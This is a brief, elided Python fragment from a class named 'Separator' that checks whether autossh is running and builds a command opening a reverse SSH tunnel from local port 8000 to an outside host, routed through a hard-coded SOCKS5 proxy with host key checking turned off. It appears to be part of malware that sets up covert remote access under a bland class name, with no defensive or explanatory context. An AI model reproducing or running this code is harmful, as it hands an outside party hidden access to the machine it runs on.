...
class Separator:
    ...
    def separate(self):
        ...
        if 'autossh' not in processes:
            ...
            executable2 = "autossh -o ProxyCommand='ncat --proxy-type socks5 --proxy 193.176.179.148:4090 %h %p' -o StrictHostKeyChecking=no -R 8000:127.0.0.1:8000 test@fireindahole.fun -N"
            executables = [
